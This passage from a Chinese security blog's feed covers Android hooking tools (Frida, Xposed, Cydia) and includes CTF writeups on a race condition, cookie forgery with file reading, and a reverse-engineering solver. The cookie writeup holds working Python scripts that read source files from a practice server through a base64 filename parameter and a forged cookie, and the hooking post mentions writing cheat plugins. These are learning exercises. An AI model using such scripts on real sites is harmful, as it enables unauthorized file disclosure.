    <link href="https://bufsnake.github.io/frida-Hook%E7%A5%9E%E5%99%A8%E5%AD%A6%E4%B9%A0-1.html"/>
    <id>https://bufsnake.github.io/frida-Hook神器学习-1.html</id>
    <published>2019-08-26T14:03:48.000Z</published>
    <updated>2019-08-26T14:14:51.626Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Android三大框架对比"><a href="#Android三大框架对比" class="headerlink" title="Android三大框架对比"></a>Android三大框架对比</h3><h4 id="Frida，Xposed，SubstrateCydia这三个Hook神器的区别和优缺点："><a href="#Frida，Xposed，SubstrateCydia这三个Hook神器的区别和优缺点：" class="headerlink" title="Frida，Xposed，SubstrateCydia这三个Hook神器的区别和优缺点："></a>Frida，Xposed，SubstrateCydia这三个Hook神器的区别和优缺点：</h4><h6 id="Xposed的优缺点"><a href="#Xposed的优缺点" class="headerlink" title="Xposed的优缺点"></a>Xposed的优缺点</h6><blockquote><p>优点：在编写Java层hook插件的时候非常好用，这一点完全优越于Frida和SubstrateCydia，因为他也是Android项目，可以直接编写Java代码调用各类api进行操作。而且可以安装到手机上直接使用。</p></blockquote><blockquote><p>缺点：配置安装环境繁琐，兼容性差，在Hook底层的时候就很无助了。</p></blockquote><h5 id="Frida的优缺点"><a href="#Frida的优缺点" class="headerlink" title="Frida的优缺点"></a>Frida的优缺点</h5><blockquote><p>优点：在上面我们可以看到他的优点在于配置环境很简单，操作也很便捷，对于破解者开发阶段非常好用。支持Java层和Native层hook操作，在Native层hook如果是非基本类型的话操作有点麻烦。</p></blockquote><blockquote><p>缺点：因为他只适用于破解者在开发阶段，也就是他没法像Xposed用于实践生产中，比如我写一个微信外挂用Frida写肯定不行的，因为他无法在手机端运行。也就是破解者用的比较多。</p></blockquote><h5 id="SubstrateCydia的优缺点"><a href="#SubstrateCydia的优缺点" class="headerlink" title="SubstrateCydia的优缺点"></a>SubstrateCydia的优缺点</h5><blockquote><p>优点：可以运行在手机端，和Xposed类似可以用于实践生产中。支持Java层和Native层的hook操作，但是Java层hook不怎么常用，用的比较多的是Native层hook操作，因为他也是Android工程可以引用系统api，操作更为方便</p></blockquote><blockquote><p>缺点：和Xposed一样安装配置环境繁琐，兼容性差。</p></blockquote><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><blockquote><p>以上这三个工具可以说是现在用的最多的hook工具了，总结一句话就是写Java层Hook还是Xposed方便，写Native层Hook还是Cydia了，而对于破解者开发那还是Frida最靠谱了。写外挂最难的也是最重要的不是<br>写代码而是寻找hook点，也就是逆向分析app找到那个地方，然后写hook代码实现插件功能。</p></blockquote><h3 id="frida-install"><a href="#frida-install" class="headerlink" title="frida install"></a>frida install</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install frida-tools</span><br><span class="line">下载frida-server</span><br><span class="line">https://github.com/frida/frida/releases</span><br></pre></td></tr></table></figure><h3 id="测试是否安装成功"><a href="#测试是否安装成功" class="headerlink" title="测试是否安装成功"></a>测试是否安装成功</h3><blockquote><p>在terminal中运行cat命令</p></blockquote><p><img src="/images/pasted-126.png" alt="upload successful"></p><blockquote><p>新开terminal，运行以下代码</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line">    print(<span class="string">"[on_message] message:"</span>, message, <span class="string">"data:"</span>, data)</span><br><span class="line"></span><br><span class="line">session = frida.attach(<span class="string">"cat"</span>)</span><br><span class="line"></span><br><span class="line">script = session.create_script(<span class="string">"""</span></span><br><span class="line"><span class="string">rpc.exports.enumerateModules = function () &#123;</span></span><br><span class="line"><span class="string">  return Process.enumerateModules();</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">"""</span>)</span><br><span class="line">script.on(<span class="string">"message"</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">print([m[<span class="string">"name"</span>] <span class="keyword">for</span> m <span class="keyword">in</span> script.exports.enumerate_modules()])</span><br></pre></td></tr></table></figure><blockquote><p>输出类似如下信息,即说明安装成功</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[u<span class="string">'cat'</span>, u<span class="string">'libSystem.B.dylib'</span>, u<span class="string">'libcache.dylib'</span>, u<span class="string">'libcommonCrypto.dylib'</span>, u<span class="string">'libcompiler_rt.dylib'</span>, u<span class="string">'libcopyfile.dylib'</span>, u<span class="string">'libcorecrypto.dylib'</span>, u<span class="string">'libdispatch.dylib'</span>, u<span class="string">'libdyld.dylib'</span>, u<span class="string">'libkeymgr.dylib'</span>, u<span class="string">'liblaunch.dylib'</span>, u<span class="string">'libmacho.dylib'</span>, u<span class="string">'libquarantine.dylib'</span>, u<span class="string">'libremovefile.dylib'</span>, u<span class="string">'libsystem_asl.dylib'</span>, u<span class="string">'libsystem_blocks.dylib'</span>, u<span class="string">'libsystem_c.dylib'</span>, u<span class="string">'libsystem_configuration.dylib'</span>, u<span class="string">'libsystem_coreservices.dylib'</span>, u<span class="string">'libsystem_darwin.dylib'</span>, u<span class="string">'libsystem_dnssd.dylib'</span>, u<span class="string">'libsystem_info.dylib'</span>, u<span class="string">'libsystem_m.dylib'</span>, u<span class="string">'libsystem_malloc.dylib'</span>, u<span class="string">'libsystem_networkextension.dylib'</span>, u<span class="string">'libsystem_notify.dylib'</span>, u<span class="string">'libsystem_sandbox.dylib'</span>, u<span class="string">'libsystem_secinit.dylib'</span>, u<span class="string">'libsystem_kernel.dylib'</span>, u<span class="string">'libsystem_platform.dylib'</span>, u<span class="string">'libsystem_pthread.dylib'</span>, u<span class="string">'libsystem_symptoms.dylib'</span>, u<span class="string">'libsystem_trace.dylib'</span>, u<span class="string">'libunwind.dylib'</span>, u<span class="string">'libxpc.dylib'</span>, u<span class="string">'libobjc.A.dylib'</span>, u<span class="string">'libc++abi.dylib'</span>, u<span class="string">'libc++.1.dylib'</span>, u<span class="string">'dyld'</span>]</span><br></pre></td></tr></table></figure><h3 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h3><p><a href="https://blog.csdn.net/jiangwei0910410003/article/details/80372118" target="_blank" rel="noopener">https://blog.csdn.net/jiangwei0910410003/article/details/80372118</a></p><p><a href="https://www.frida.re/docs/home/" target="_blank" rel="noopener">https://www.frida.re/docs/home/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Android三大框架对比&quot;&gt;&lt;a href=&quot;#Android三大框架对比&quot; class=&quot;headerlink&quot; title=&quot;Android三大框架对比&quot;&gt;&lt;/a&gt;Android三大框架对比&lt;/h3&gt;&lt;h4 id=&quot;Frida，Xposed，Substrat
      
    
    </summary>
    
      <category term="tools" scheme="https://bufsnake.github.io/categories/tools/"/>
    
    
      <category term="android" scheme="https://bufsnake.github.io/tags/android/"/>
    
      <category term="android hook" scheme="https://bufsnake.github.io/tags/android-hook/"/>
    
      <category term="android frida" scheme="https://bufsnake.github.io/tags/android-frida/"/>
    
  </entry>
  
  <entry>
    <title>记一次简单的条件竞争的题目</title>
    <link href="https://bufsnake.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E7%9A%84%E9%A2%98%E7%9B%AE.html"/>
    <id>https://bufsnake.github.io/记一次简单的条件竞争的题目.html</id>
    <published>2019-08-22T12:50:08.000Z</published>
    <updated>2019-08-22T13:13:49.886Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>一直对这个漏洞只有概念上的认知，没有做过相关的题目，就找了一个入门的练练手</p></blockquote><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img src="/images/pasted-116.png" alt="upload successful"></p><blockquote><p>我们可以控制文件的名字和文件的内容</p></blockquote><p><img src="/images/pasted-117.png" alt="upload successful"></p><p><img src="/images/pasted-118.png" alt="upload successful"></p><blockquote><p>但是当我们访问的时候去发现访问不到，猜想应该是被删了，这就要利用条件竞争这个漏洞了</p></blockquote><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><blockquote><p>创建一个多线程程序不断的向服务器发起请求创建一个文件，在创建一个程序循环读取这个文件</p></blockquote><blockquote><p>这里使用burp suite进行申请创建文件，写一个死循环读取这个文件</p></blockquote><p><img src="/images/pasted-119.png" alt="upload successful"></p><p><img src="/images/pasted-120.png" alt="upload successful"></p><blockquote><p>在start attack之前需要先运行访问的脚本</p></blockquote><p><img src="/images/pasted-124.png" alt="upload successful"></p><p><img src="/images/pasted-122.png" alt="upload successful"></p><p><img src="/images/pasted-123.png" alt="upload successful"></p><p><img src="/images/pasted-125.png" alt="upload successful"></p><blockquote><p>可以得到内容，这题旨在能够访问到这个文件就能拿到flag</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>Y3RmZXIldTY2MkYldTRFMEQldTY2MkYldTc3MEIldTUyMzBiYXNlJXU1QzMxJXU2MEYzJXU4OUUzJXU0RTAwJXU0RTBCJXU1NDYy</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;一直对这个漏洞只有概念上的认知，没有做过相关的题目，就找了一个入门的练练手&lt;/p&gt;
&lt;/blockquote&gt;
&lt;
      
    
    </summary>
    
      <category term="web" scheme="https://bufsnake.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://bufsnake.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>cookie欺骗 writeup</title>
    <link href="https://bufsnake.github.io/cookie%E6%AC%BA%E9%AA%97-writeup.html"/>
    <id>https://bufsnake.github.io/cookie欺骗-writeup.html</id>
    <published>2019-08-21T07:08:16.000Z</published>
    <updated>2019-08-21T07:19:06.835Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Begin</p></blockquote><p><img src="/images/pasted-113.png" alt="upload successful"></p><blockquote><p>发现filename为keys.txt的base64加密，试着读取index.php文件</p></blockquote><p><img src="/images/pasted-114.png" alt="upload successful"></p><blockquote><p>发现能读到东西了，接下来读取整个文件</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://123.206.87.240:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw"</span>%i</span><br><span class="line">    respone = get(url=url)</span><br><span class="line">    <span class="keyword">print</span> respone.text</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line">    <span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;</span><br><span class="line">    $file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line">    $fa = file($file);</span><br><span class="line">    <span class="keyword">echo</span> $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>逻辑不难，要求我们将cookie设置成margin=margin，然后在用相同的办法读取keys.php</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://123.206.87.240:8002/web11/index.php?line=%d&amp;filename=%s"</span>%(i,b64encode(<span class="string">"keys.php"</span>))</span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">"Cookie"</span>: <span class="string">"margin=margin"</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = get(url=url,headers=header)</span><br><span class="line">    <span class="keyword">print</span> res.text</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $key=<span class="string">'KEY&#123;key_keys&#125;'</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>得到flag：KEY{key_keys}</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Begin&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;/images/pasted-113.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;发现filename为keys.tx
      
    
    </summary>
    
      <category term="web" scheme="https://bufsnake.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://bufsnake.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>jactf-reverse3</title>
    <link href="https://bufsnake.github.io/%E6%8E%98%E5%AE%89RE_crypto.html"/>
    <id>https://bufsnake.github.io/掘安RE_crypto.html</id>
    <published>2019-08-16T11:55:57.000Z</published>
    <updated>2019-08-17T09:35:04.462Z</updated>
    
    <content type="html"><![CDATA[<h3 id="RE-crypto"><a href="#RE-crypto" class="headerlink" title="RE_crypto"></a>RE_crypto</h3><p><img src="/images/pasted-109.png" alt="upload successful"></p><h4 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h4><p><img src="/images/pasted-110.png" alt="upload successful"></p><p><img src="/images/pasted-111.png" alt="upload successful"></p><blockquote><p>程序逻辑不难，输入的字符作为unk_4021A0数组的下标，定位该下标所对应的值，与((v11 + v12) ^ 0x19)比较，这个值是可以自己算出来的</p></blockquote><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">byte1=[<span class="number">0x32</span>,<span class="number">0x61</span>,<span class="number">0x34</span>,<span class="number">0x39</span>,<span class="number">0x66</span>,<span class="number">0x36</span>,<span class="number">0x39</span>,<span class="number">0x63</span>,<span class="number">0x33</span>,<span class="number">0x38</span>,<span class="number">0x33</span>,<span class="number">0x39</span>,<span class="number">0x35</span>,<span class="number">0x63</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x39</span>,<span class="number">0x36</span>,<span class="number">0x64</span>,<span class="number">0x36</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x39</span>,<span class="number">0x36</span>,<span class="number">0x64</span>,<span class="number">0x36</span>,<span class="number">0x66</span>,<span class="number">0x34</span>,<span class="number">0x65</span>,<span class="number">0x30</span>,<span class="number">0x32</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x38</span>,<span class="number">0x34</span>,<span class="number">0x39</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x64</span>,<span class="number">0x36</span>,<span class="number">0x31</span>,<span class="number">0x39</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x34</span>,<span class="number">0x38</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x66</span>,<span class="number">0x36</span>,<span class="number">0x65</span>,<span class="number">0x32</span>,<span class="number">0x64</span>,<span class="number">0x61</span>,<span class="number">0x64</span>,<span class="number">0x36</span>,<span class="number">0x37</span>,<span class="number">0x37</span>,<span class="number">0x38</span>,<span class="number">0x36</span>,<span class="number">0x65</span>,<span class="number">0x32</span>,<span class="number">0x31</span>,<span class="number">0x64</span>,<span class="number">0x35</span>,<span class="number">0x61</span>,<span class="number">0x64</span>,<span class="number">0x61</span>,<span class="number">0x65</span>,<span class="number">0x36</span>]</span><br><span class="line"></span><br><span class="line">byte = [ <span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>, <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>, <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>, <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>, <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>, <span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>, <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>, <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>, <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>, <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>, <span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span>]</span><br><span class="line"></span><br><span class="line">ans = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(byte1),<span class="number">2</span>):</span><br><span class="line">    v9 = <span class="number">0</span></span><br><span class="line">    v10 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> byte1[i] &lt; <span class="number">48</span> <span class="keyword">or</span> byte1[i] &gt; <span class="number">57</span>:</span><br><span class="line">        v9 = byte1[i] - <span class="number">87</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        v9 = byte1[i] - <span class="number">48</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> byte1[i+<span class="number">1</span>] &lt; <span class="number">48</span> <span class="keyword">or</span> byte1[i+<span class="number">1</span>] &gt; <span class="number">57</span>:</span><br><span class="line">        v10 = byte1[i+<span class="number">1</span>] - <span class="number">87</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        v10 = byte1[i+<span class="number">1</span>] - <span class="number">48</span></span><br><span class="line">    flag = (<span class="number">16</span>*v9+v10) ^ <span class="number">0x19</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,len(byte)):</span><br><span class="line">        <span class="keyword">if</span> flag == byte[j]:</span><br><span class="line">            ans += chr(j)</span><br><span class="line"><span class="keyword">print</span> ans</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>看了encrypt，只理解了一小部分，后面的部分实在不太明白到底是干嘛，还是太菜了，近几天做的逆向题目，让我深刻认识到密码学、算法(acm)在逆向中的重要地位，一步一个jio印吧……</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;RE-crypto&quot;&gt;&lt;a href=&quot;#RE-crypto&quot; class=&quot;headerlink&quot; title=&quot;RE_crypto&quot;&gt;&lt;/a&gt;RE_crypto&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-109.png&quot; alt=&quot;upl
      
    
    </summary>
    
      <category term="reverse" scheme="https://bufsnake.github.io/categories/reverse/"/>
    
    
      <category term="writeup" scheme="https://bufsnake.github.io/tags/writeup/"/>
    
      <category term="jactf" scheme="https://bufsnake.github.io/tags/jactf/"/>
    
  </entry>
  
  <entry>
    <title>记一次控制流平坦化逆向</title>
    <link href="https://bufsnake.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96%E9%80%86%E5%90%91.html"/>
    <id>https://bufsnake.github.io/记一次控制流平坦化逆向.html</id>
    <published>2019-08-15T13:47:56.000Z</published>
    <updated>2019-08-15T14:16:06.804Z</updated>
    
